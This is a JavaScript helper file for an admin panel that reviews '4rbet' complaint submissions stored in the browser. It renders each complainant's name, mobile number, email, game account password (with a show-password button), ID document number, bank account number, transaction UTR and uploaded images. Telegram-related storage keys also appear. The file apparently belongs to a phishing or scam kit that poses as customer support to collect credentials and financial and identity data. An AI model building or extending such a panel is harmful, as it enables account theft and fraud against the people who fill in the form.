/* ==========================================
   4R-ADMIN  |  admin.js
   Shared helpers for all admin panel pages.
   ========================================== */

window.AdminPanel = (function () {
  "use strict";

  var STORE_KEY = "4rbet_complaints";
  var UI_KEY    = "4rbet_ui";

  /* ---------- Assets ---------- */

  var LOGO   = "FAVICON/photo_2026-10-01_23-26-57.jpg";
  var ICONS  = "USER-ICON/";

  /* ---------- Panel preferences ---------- */

  function getUI() {
    try {
      var raw = localStorage.getItem(UI_KEY);
      var d = raw ? JSON.parse(raw) : {};
      return { splash: d.splash !== false, showPassword: d.showPassword === true };
    } catch (e) {
      return { splash: true, showPassword: false };
    }
  }

  function saveUI(patch) {
    var next = {
      splash:       patch.splash       !== undefined ? !!patch.splash       : getUI().splash,
      showPassword: patch.showPassword !== undefined ? !!patch.showPassword : getUI().showPassword
    };
    try {
      localStorage.setItem(UI_KEY, JSON.stringify(next));
      return true;
    } catch (e) {
      return false;
    }
  }

  function storageKB() {
    try {
      var bytes = 0;
      ["4rbet_complaints", "4rbet_telegram", "4rbet_ui", "4rbet_tg_queue"].forEach(function (k) {
        var v = localStorage.getItem(k);
        if (v) bytes += v.length + k.length;
      });
      return (bytes / 1024).toFixed(1);
    } catch (e) {
      return "0";
    }
  }

  /* ==========================================
     SHELL : menu (left) + year + active item
     (opening animation admin panel me nahi hai)
     ========================================== */

  function initShell() {
    var drop = document.getElementById("menuDrop");
    var btn  = document.getElementById("menuBtn");

    if (btn && drop) {
      btn.addEventListener("click", function (e) {
        e.stopPropagation();
        var open = drop.classList.toggle("is-open");
        btn.classList.toggle("is-open", open);
        btn.setAttribute("aria-expanded", String(open));
      });

      var close = function () {
        drop.classList.remove("is-open");
        btn.classList.remove("is-open");
        btn.setAttribute("aria-expanded", "false");
      };

      document.addEventListener("click", function (e) {
        if (!drop.contains(e.target) && !btn.contains(e.target)) close();
      });

      document.addEventListener("keydown", function (e) {
        if (e.key === "Escape") close();
      });
    }

    document.querySelectorAll("#year, .year").forEach(function (el) {
      el.textContent = new Date().getFullYear();
    });

    /* user-icon image na mile to apna svg avatar */
    document.addEventListener("error", function (e) {
      var t = e.target;
      if (!t || t.tagName !== "IMG" || !t.hasAttribute("data-ua")) return;
      t.removeAttribute("data-ua");
      t.outerHTML = '<span class="adm-ava-fb">' + ICON.user + "</span>";
    }, true);

    markActiveMenu();
  }

  function markActiveMenu() {
    var drop = document.getElementById("menuDrop");
    if (!drop) return;

    var file = (window.location.pathname.split("/").pop() || "").toLowerCase();
    var links = drop.querySelectorAll(".menu-item");
    var i;

    for (i = 0; i < links.length; i++) {
      if ((links[i].getAttribute("href") || "").toLowerCase() === file) {
        links[i].classList.add("is-active");
        return;
      }
    }
  }

  /* ==========================================
     STORE
     ========================================== */

  function load() {
    try {
      var raw = localStorage.getItem(STORE_KEY);
      return raw ? JSON.parse(raw) : [];
    } catch (e) {
      return [];
    }
  }

  function persist(list) {
    try {
      localStorage.setItem(STORE_KEY, JSON.stringify(list));
      return true;
    } catch (e) {
      return false;
    }
  }

  function findById(id) {
    var list = load();
    for (var i = 0; i < list.length; i++) if (list[i].id === id) return list[i];
    return null;
  }

  function setStatus(id, status) {
    if (!STATUS[status]) return false;
    var list = load();
    var hit = false;
    list.forEach(function (r) {
      if (r.id === id) {
        r.status = status;
        r.statusAt = new Date().toISOString();
        hit = true;
      }
    });
    return hit ? persist(list) : false;
  }

  function removeById(id) {
    var list = load();
    var next = list.filter(function (r) { return r.id !== id; });
    if (next.length === list.length) return false;
    return persist(next);
  }

  function statusOf(rec) {
    return STATUS[rec && rec.status] ? rec.status : "pending";
  }

  /* ---------- Counts ---------- */

  function isToday(iso) {
    var d = new Date(iso);
    if (isNaN(d)) return false;
    var n = new Date();
    return d.getFullYear() === n.getFullYear() &&
           d.getMonth() === n.getMonth() &&
           d.getDate() === n.getDate();
  }

  function counts() {
    var list = load();
    return {
      total:   list.length,
      today:   list.filter(function (r) { return isToday(r.submittedAt); }).length,
      pending: list.filter(function (r) { return statusOf(r) === "pending"; }).length,
      preview: list.filter(function (r) { return statusOf(r) === "previewing"; }).length,
      success: list.filter(function (r) { return statusOf(r) === "successful"; }).length
    };
  }

  /* ==========================================
     FORMAT / ESCAPE
     ========================================== */

  function esc(s) {
    return String(s === undefined || s === null ? "" : s)
      .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function pad(n) { return n < 10 ? "0" + n : "" + n; }

  function formatDateTime(iso) {
    var d = new Date(iso);
    if (isNaN(d)) return "-";
    var h = d.getHours();
    var h12 = h % 12 || 12;
    return d.getDate() + "/" + pad(d.getMonth() + 1) + "/" + d.getFullYear() +
           ", " + h12 + ":" + pad(d.getMinutes()) + " " + (h >= 12 ? "PM" : "AM");
  }

  function shortTime(iso) {
    var d = new Date(iso);
    if (isNaN(d)) return "-";
    var h = d.getHours();
    var h12 = h % 12 || 12;
    return d.getDate() + "/" + pad(d.getMonth() + 1) + "/" + d.getFullYear() +
           " \u00b7 " + h12 + ":" + pad(d.getMinutes()) + " " + (h >= 12 ? "PM" : "AM");
  }

  /* ==========================================
     ICONS
     ========================================== */

  var ICON = {
    user:   '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>',
    eye:    '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>',
    lock:   '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10.5" width="16" height="10.5" rx="2"></rect><path d="M8 10.5V7a4 4 0 0 1 8 0v3.5"></path></svg>',
    chev:   '<svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"></path></svg>',
    down:   '<svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><path d="M7 10l5 5 5-5"></path><path d="M12 15V3"></path></svg>',
    inbox:  '<svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-6l-2 3h-4l-2-3H2"></path><path d="M5.45 5.11 2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11Z"></path></svg>',
    status: '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"></path></svg>',
    warn:   '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 9v4"></path><path d="M12 17h.01"></path><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0Z"></path></svg>'
  };

  var STATUS = {
    pending:    "Pending",
    previewing: "Previewing",
    successful: "Successful"
  };

  /* ==========================================
     COMPLAINT CARD  (home page)
     ========================================== */

  function cardHtml(rec) {
    var st = statusOf(rec);
    var d  = rec.data || {};

    return '<button type="button" class="adm-card" data-id="' + esc(rec.id) + '">' +
             '<span class="adm-ava"><img src="' + ICONS + "2288510.png" + '" alt="" data-ua></span>' +
             '<span class="adm-cmid">' +
               '<span class="adm-cname">' + esc(d.userName || "Unknown User") + '</span>' +
               '<span class="adm-cat">' + esc(rec.category || "Complaint") + '</span>' +
               '<span class="adm-cwhen">' + esc(shortTime(rec.submittedAt)) + '</span>' +
             '</span>' +
             '<span class="adm-cright">' +
               '<span class="adm-status adm-status--' + st + '">' + esc(STATUS[st]) + '</span>' +
               '<span class="adm-chev">' + ICON.chev + '</span>' +
             '</span>' +
           '</button>';
  }

  function bindCards(scope, onOpen) {
    scope.querySelectorAll(".adm-card").forEach(function (btn) {
      btn.addEventListener("click", function () {
        if (onOpen) onOpen(btn.getAttribute("data-id"));
        else window.location.href = "complaint.html?id=" + encodeURIComponent(btn.getAttribute("data-id"));
      });
    });
  }

  /* ==========================================
     DETAIL : form rows + one action button row
     ========================================== */

  var FIELD_ORDER = [
    { key: "userName",    label: "User Name" },
    { key: "mobile",      label: "Mobile Number" },
    { key: "email",       label: "Email ID" },
    { key: "password",    label: "Game Account Password", secret: true },
    { key: "problem",     label: "Select Your Problem" },
    { key: "amount",      label: "Amount" },
    { key: "verifyEmail", label: "Email To Verify" },
    { key: "docType",     label: "Document Type" },
    { key: "docNo",       label: "Document No." },
    { key: "accountNo",   label: "Account Number" },
    { key: "utr",         label: "Transaction / UTR" },
    { key: "detail",      label: "Detail" }
  ];

  /* Saare action buttons (Show Password + View Image 1..n)
     ek hi row me side by side. Buttons zyada ho to label chhota
     ho jata hai taaki ek line me hi sab fit ho jayein. */
  function actsHtml(rec) {
    var d = rec.data || {};
    var imgs = (rec.images || []).filter(function (im) { return im && im.dataUrl; });
    var out = "";

    if (d.password) {
      /* 2 ya usse zyada image -> chhota label aur icon hata do,
         taaki saare buttons ek hi line me fit ho jayein */
      var tight = imgs.length >= 2;
      out += '<button type="button" class="adm-act adm-act--soft" data-reveal>' +
               (tight ? "" : ICON.lock) +
               '<span data-reveal-text>' + (tight ? "Password" : "Show Password") + '</span>' +
             '</button>';
    }

    imgs.forEach(function (im, i) {
      out += '<button type="button" class="adm-act" data-img="' + i + '">' +
               ICON.eye + "Image " + (i + 1) +
             '</button>';
    });

    return out;
  }

  function rowsHtml(rec) {
    var d = rec.data || {};
    var out = "";

    FIELD_ORDER.forEach(function (f) {
      var val = d[f.key];
      if (val === undefined || val === null || String(val).trim() === "") return;

      if (f.secret) {
        out += '<div class="adm-row">' +
                 '<span class="adm-row-k">' + esc(f.label) + '</span>' +
                 '<span class="adm-row-v is-secret" data-secret>' +
                   '\u2022'.repeat(String(val).length) +
                 '</span>' +
               '</div>';
        return;
      }

      var plain = (f.key === "detail") ? " is-plain" : "";
      out += '<div class="adm-row">' +
               '<span class="adm-row-k">' + esc(f.label) + '</span>' +
               '<span class="adm-row-v' + plain + '">' + esc(val) + '</span>' +
             '</div>';
    });

    return out;
  }

  /* ==========================================
     TOAST  (green "Update Successful")
     ========================================== */

  var toastEl = null;
  var toastTimer = null;

  function toast(text, isError) {
    if (!toastEl) {
      toastEl = document.createElement("div");
      toastEl.className = "adm-toast";
      document.body.appendChild(toastEl);
    }
    toastEl.classList.toggle("adm-toast--err", !!isError);
    toastEl.textContent = text;
    void toastEl.offsetWidth;
    toastEl.classList.add("is-show");

    clearTimeout(toastTimer);
    toastTimer = setTimeout(function () { toastEl.classList.remove("is-show"); }, 2200);
  }

  /* ==========================================
     STATUS POPUP
     "Status Update" button -> 3 options -> Update
     ========================================== */

  function statusPopup(opts) {
    var box = document.createElement("div");
    box.className = "adm-pop";
    box.innerHTML =
      '<div class="adm-pop-box" role="dialog" aria-modal="true">' +
        '<div class="adm-pop-head">' +
          '<h3>Update Status</h3>' +
          '<p>Ek status choose karein, phir Update dabayein.</p>' +
        '</div>' +
        '<div class="adm-pop-body">' +
          '<button type="button" class="adm-opt adm-opt--pending" data-s="pending"><i></i>Pending</button>' +
          '<button type="button" class="adm-opt adm-opt--previewing" data-s="previewing"><i></i>Previewing</button>' +
          '<button type="button" class="adm-opt adm-opt--successful" data-s="successful"><i></i>Successful</button>' +
          '<button type="button" class="btn btn--block" data-apply>Update</button>' +
          '<button type="button" class="adm-pop-close" data-cancel>Cancel</button>' +
        '</div>' +
      '</div>';

    document.body.appendChild(box);

    var picked = opts.current || null;
    var applyBtn = box.querySelector("[data-apply]");

    function paint() {
      box.querySelectorAll(".adm-opt").forEach(function (o) {
        o.classList.toggle("is-on", o.getAttribute("data-s") === picked);
      });
      applyBtn.style.opacity = picked ? "1" : ".45";
      applyBtn.disabled = !picked;
    }

    function close() {
      box.classList.remove("is-open");
      document.removeEventListener("keydown", onKey);
    }

    function onKey(e) {
      if (e.key === "Escape" && box.classList.contains("is-open")) close();
    }

    box.addEventListener("click", function (e) {
      var o = e.target.closest(".adm-opt");
      if (o) { picked = o.getAttribute("data-s"); paint(); return; }

      if (e.target === box || e.target.closest("[data-cancel]")) { close(); return; }

      if (e.target.closest("[data-apply]")) {
        if (!picked) return;
        close();
        opts.onUpdate(picked);
      }
    });

    document.addEventListener("keydown", onKey);
    paint();
    box.classList.add("is-open");

    return { close: close };
  }

  /* ==========================================
     IMAGE VIEWER : image + close + download
     ========================================== */

  var viewer = null;
  var vImg = null;
  var vName = null;
  var currentSrc = "";

  function buildViewer() {
    viewer = document.createElement("div");
    viewer.className = "adm-viewer";
    viewer.setAttribute("role", "dialog");
    viewer.setAttribute("aria-modal", "true");
    viewer.innerHTML =
      '<div class="adm-viewer-img-wrap"><img alt="Complaint image"></div>' +
      '<p class="adm-viewer-name"></p>' +
      '<div class="adm-viewer-acts">' +
        '<button type="button" class="adm-vact adm-vact--close">' +
          '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>' +
          'Close</button>' +
        '<button type="button" class="adm-vact adm-vact--down">' +
          '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><path d="M7 10l5 5 5-5"></path><path d="M12 15V3"></path></svg>' +
          'Download</button>' +
      '</div>';

    document.body.appendChild(viewer);

    vImg  = viewer.querySelector("img");
    vName = viewer.querySelector(".adm-viewer-name");

    viewer.querySelector(".adm-vact--close").addEventListener("click", closeViewer);
    viewer.querySelector(".adm-vact--down").addEventListener("click", downloadCurrent);

    document.addEventListener("keydown", function (e) {
      if (e.key === "Escape" && viewer.classList.contains("is-open")) closeViewer();
    });
  }

  function openViewer(src, name) {
    if (!viewer) buildViewer();
    currentSrc = src;
    vImg.src = src;
    vName.textContent = name || "";
    viewer.classList.add("is-open");
  }

  function closeViewer() {
    if (!viewer) return;
    viewer.classList.remove("is-open");
    vImg.removeAttribute("src");
    currentSrc = "";
  }

  function downloadCurrent() {
    if (!currentSrc) return;

    var name = (vName.textContent || "image").replace(/[^\w.\- ]+/g, "_");
    if (!/\.[a-z0-9]{2,4}$/i.test(name)) name += ".jpg";

    var a = document.createElement("a");
    a.href = currentSrc;
    a.download = name;
    document.body.appendChild(a);
    a.click();
    a.remove();
  }

  return {
    LOGO: LOGO,
    ICONS: ICONS,
    STATUS: STATUS,
    ICON: ICON,
    getUI: getUI,
    saveUI: saveUI,
    storageKB: storageKB,
    initShell: initShell,
    markActiveMenu: markActiveMenu,
    load: load,
    findById: findById,
    setStatus: setStatus,
    removeById: removeById,
    statusOf: statusOf,
    counts: counts,
    isToday: isToday,
    esc: esc,
    formatDateTime: formatDateTime,
    shortTime: shortTime,
    cardHtml: cardHtml,
    bindCards: bindCards,
    rowsHtml: rowsHtml,
    actsHtml: actsHtml,
    toast: toast,
    statusPopup: statusPopup,
    openViewer: openViewer,
    closeViewer: closeViewer
  };

})();
